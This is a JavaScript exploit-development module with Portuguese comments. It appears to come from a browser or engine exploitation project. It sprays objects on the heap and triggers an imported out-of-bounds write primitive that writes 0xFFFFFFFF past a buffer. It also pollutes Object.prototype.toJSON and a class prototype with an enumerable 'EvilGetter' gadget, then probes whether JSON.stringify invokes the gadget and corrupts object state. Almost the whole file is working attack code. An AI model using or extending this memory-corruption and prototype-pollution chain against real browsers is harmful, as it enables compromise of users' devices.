// js/script3/testForInGadgetExploration.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const GADGET_PROPERTY_NAME = "AAAA_GdgT_DetailedExplore"; // Nome único para o getter
let gadget_getter_called_flag = false;
let last_gadget_this_id_logged = null;

// Objeto para armazenar o estado detalhado de 'this' capturado dentro do getter
let captured_getter_this_state = {};

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345; // Number
        this.value2 = "initial_state"; // String
        this.marker = 0xCAFECAFE; // Number (hex)
        this.anotherProperty = "clean_state"; // String
        // Não vamos definir newPropertyByGetter aqui, o getter tentará adicioná-la
    }

    // checkIntegrity não será chamado pela toJSON para manter a toJSON focada
}

// toJSON que usa for...in, que anteriormente acionou o getter enumerável
export function toJSON_TriggerForInGadget() {
    const FNAME_toJSON = "toJSON_TriggerForInGadget";
    // Log mínimo na entrada para não poluir muito
    // logS3(`[${FNAME_toJSON}] Chamada. this.id: ${this && typeof this.id !== 'undefined' ? this.id : 'N/A'}`, "info", FNAME_toJSON);
    let props_iterated_log = "";
    let iteration_count = 0;
    const max_iterations_for_log = 30; // Log mais propriedades se necessário
    let error_in_loop = null;
    let returned_payload = {}; // O objeto que JSON.stringify irá serializar

    try {
        // Tenta construir um payload simples, o for...in é a parte crítica
        for (const prop in this) {
            iteration_count++;
            if (iteration_count <= max_iterations_for_log) {
                props_iterated_log += `${prop};`;
            } else if (iteration_count === max_iterations_for_log + 1) {
                props_iterated_log += `... (mais ${prop})`;
            }
            // Apenas o fato de iterar e JSON.stringify tentar acessar 'AAAA_GdgT_DetailedExplore' deve acionar o getter.
            // Não precisamos fazer nada explícito com 'prop' aqui para acionar o getter se ele for enumerável.
            // No entanto, para que JSON.stringify processe o objeto, ele tentará obter os valores.
             if (Object.prototype.hasOwnProperty.call(this, prop) && typeof this[prop] !== 'function') {
                returned_payload[prop] = this[prop]; // Isso pode acionar o getter se prop for GADGET_PROPERTY_NAME
             }


            if (iteration_count > 7000) {
                logS3(`[${FNAME_toJSON}] Loop for...in excedeu 7000 iterações para this.id=${this.id}. Interrompendo.`, "warn", FNAME_toJSON);
                error_in_loop = "Max iterations (7000) in for...in";
                break;
            }
        }
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO dentro do loop for...in para this.id=${this.id}: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        error_in_loop = `${e.name}: ${e.message}`;
    }

    returned_payload._toJSON_variant_ = FNAME_toJSON;
    returned_payload._id_ = (this && typeof this.id !== 'undefined' ? this.id : 'N/A');
    returned_payload._iterations_ = iteration_count;
    if (error_in_loop) returned_payload._error_in_loop_ = error_in_loop;
    if (props_iterated_log) returned_payload._props_sample_ = props_iterated_log.substring(0,200);

    return returned_payload;
}


export async function executeForInGadgetExplorationTest_V2() {
    const FNAME_TEST = "executeForInGadgetExplorationTest_V2";
    logS3(`--- Iniciando Teste: Exploração Detalhada Dentro do Getter (V2) ---`, "test", FNAME_TEST);
    document.title = `Explore ForIn Gadget V2`;

    gadget_getter_called_flag = false; // Resetar a flag global
    last_gadget_this_id_logged = null;
    captured_getter_this_state = {}; // Resetar estado capturado

    let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
    let getterPollutionApplied = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
            get: function() {
                const GETTER_FNAME = "EvilGetterV2";
                logS3(`!!!! GADGET GETTER '${GADGET_PROPERTY_NAME}' CHAMADO !!!!`, "vuln", GETTER_FNAME);
                gadget_getter_called_flag = true;
                captured_getter_this_state = {}; // Limpa para cada chamada

                try {
                    captured_getter_this_state.id_read = this.id;
                    logS3(`   [${GETTER_FNAME}] this.id: ${captured_getter_this_state.id_read}`, "info", GETTER_FNAME);
                    last_gadget_this_id_logged = captured_getter_this_state.id_read;

                    captured_getter_this_state.instanceof_MyComplexObject = this instanceof MyComplexObject;
                    logS3(`   [${GETTER_FNAME}] this instanceof MyComplexObject: ${captured_getter_this_state.instanceof_MyComplexObject}`, "info", GETTER_FNAME);
                    captured_getter_this_state.toString_call_this = Object.prototype.toString.call(this);
                    logS3(`   [${GETTER_FNAME}] Object.prototype.toString.call(this): ${captured_getter_this_state.toString_call_this}`, "info", GETTER_FNAME);

                    captured_getter_this_state.value1_before = this.value1;
                    this.value1 = 99999;
                    captured_getter_this_state.value1_after = this.value1;

                    captured_getter_this_state.value2_before = this.value2;
                    this.value2 = "corrupted_by_gadget";
                    captured_getter_this_state.value2_after = this.value2;

                    captured_getter_this_state.marker_before = this.marker;
                    this.marker = 0xBADF00D; // Tenta modificar
                    captured_getter_this_state.marker_after = this.marker;

                    captured_getter_this_state.anotherProperty_before = this.anotherProperty;
                    this.anotherProperty = "overwritten_by_gadget";
                    captured_getter_this_state.anotherProperty_after = this.anotherProperty;

                    this.newPropertyByGetter = "dynamically_added_by_V2_getter";
                    captured_getter_this_state.newProperty_value = this.newPropertyByGetter;

                    logS3(`   [${GETTER_FNAME}] Modificações internas: value1=${this.value1}, value2="${this.value2}", marker=${toHex(this.marker)}, anotherProp="${this.anotherProperty}", newProp="${this.newPropertyByGetter}"`, "info", GETTER_FNAME);

                } catch (e_getter_ops) {
                    logS3(`   [${GETTER_FNAME}] ERRO DENTRO DO GETTER ao operar em 'this': ${e_getter_ops.name} - ${e_getter_ops.message}`, "error", GETTER_FNAME);
                    captured_getter_this_state.error_in_modification = `${e_getter_ops.name}: ${e_getter_ops.message}`;
                }
                return "evil_value_returned_from_V2_getter"; // O getter deve retornar algo
            },
            configurable: true,
            enumerable: true // Importante para que for...in o encontre
        });
        getterPollutionApplied = true;
        logS3("Getter definido em MyComplexObject.prototype.", "good", FNAME_TEST);

    } catch (e_getter_setup) {
        logS3(`ERRO ao definir o getter: ${e_getter_setup.message}`, "error", FNAME_TEST);
        return;
    }

    const spray_count = 50;
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) { /* ... error handling ... */ }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando OOB e escrevendo 0xFFFFFFFF em oob_ab[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) { /* ... error handling ... */ return; }
    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) { /* ... error handling ... */ return; }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando ${sprayed_objects.length} objetos com toJSON_TriggerForInGadget...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected_during_sondagem = false;
    let affected_object_index = -1;
    let first_affected_object_state_after = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerForInGadget,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10);
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);

        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            gadget_getter_called_flag = false; // Reset para este objeto
            captured_getter_this_state = {}; // Reset para este objeto

            document.title = `Sondando Obj ${i} - ForInGadgetExplV2`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando objeto ${i} (ID: ${obj.id}). Props originais: marker=${toHex(obj.marker)}, val1=${obj.value1}, val2="${obj.value2}", anotherProp="${obj.anotherProperty}"`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Retorno da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
            }

            if (gadget_getter_called_flag) {
                logS3(`   !!!! SUCESSO: Gadget Getter '${GADGET_PROPERTY_NAME}' FOI CHAMADO para obj.id=${last_gadget_this_id_logged} (index ${i})!!!!`, "vuln", FNAME_TEST);
                logS3(`        Estado de 'this' DENTRO do Getter (capturado):`, "info", FNAME_TEST);
                for(const key in captured_getter_this_state){
                    logS3(`          ${key}: ${captured_getter_this_state[key]}`, "info", FNAME_TEST);
                }

                // Verificar o objeto original após a chamada
                first_affected_object_state_after = {
                    id: obj.id,
                    marker: obj.marker,
                    value1: obj.value1,
                    value2: obj.value2,
                    anotherProperty: obj.anotherProperty,
                    newPropertyByGetter: obj.newPropertyByGetter // Checar se a nova propriedade existe
                };
                logS3(`        Estado do sprayed_objects[${i}] (ID: ${obj.id}) APÓS chamada ao getter:`, "info", FNAME_TEST);
                logS3(`          obj.marker: ${toHex(obj.marker)} (Esperado: 0xBADF00D se modificação persistiu)`, obj.marker === 0xBADF00D ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.value1: ${obj.value1} (Esperado: 99999 se modificação persistiu)`, obj.value1 === 99999 ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.value2: "${obj.value2}" (Esperado: "corrupted_by_gadget" se modificação persistiu)`, obj.value2 === "corrupted_by_gadget" ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.anotherProperty: "${obj.anotherProperty}" (Esperado: "overwritten_by_gadget" se modificação persistiu)`, obj.anotherProperty === "overwritten_by_gadget" ? "good" : "warn", FNAME_TEST);
                logS3(`          obj.newPropertyByGetter: "${obj.newPropertyByGetter}" (Esperado: "dynamically_added_by_V2_getter")`, obj.newPropertyByGetter === "dynamically_added_by_V2_getter" ? "good" : "warn", FNAME_TEST);

                problem_detected_during_sondagem = true;
                affected_object_index = i;
                document.title = `SUCCESS: ForIn Gadget Called on ${obj.id}! Props Modified!`;
                break;
            }

            if (errorDuringStringify) {
                logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name} - ${errorDuringStringify.message}`, "error", FNAME_TEST);
                problem_detected_during_sondagem = true;
                affected_object_index = i;
                document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
                if (errorDuringStringify.name === 'RangeError') {
                    logS3("       RangeError ocorreu. O loop for...in pode ser instável.", "warn", FNAME_TEST);
                }
                break;
            }
             await PAUSE_S3(SHORT_PAUSE_S3);
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (gadget_getter_called_flag) {
        logS3(`Teste CONCLUÍDO: O Gadget Getter FOI ACIONADO no objeto com ID: ${last_gadget_this_id_logged} (index ${affected_object_index})!`, "vuln", FNAME_TEST);
        if(first_affected_object_state_after && first_affected_object_state_after.marker === 0xBADF00D) {
            logS3("   >>> MODIFICAÇÃO DE PROPRIEDADE DENTRO DO GETTER CONFIRMADA NO OBJETO ORIGINAL! <<<", "critical", FNAME_TEST);
        }
    } else if (problem_detected_during_sondagem) {
        logS3(`Teste CONCLUÍDO: Um problema (erro) ocorreu durante a sondagem do objeto com index ${affected_object_index}.`, "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Nenhum gadget getter acionado ou erro óbvio nos objetos sondados.", "good", FNAME_TEST);
    }

    if (getterPollutionApplied) {
        if (originalGetterDescriptor) {
            Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
        } else {
            delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
    }

    logS3(`--- Teste Exploração Detalhada Dentro do Getter (V2) CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = gadget_getter_called_flag ? document.title : (problem_detected_during_sondagem ? document.title : `ForIn Gadget ExplV2 Done`);
}
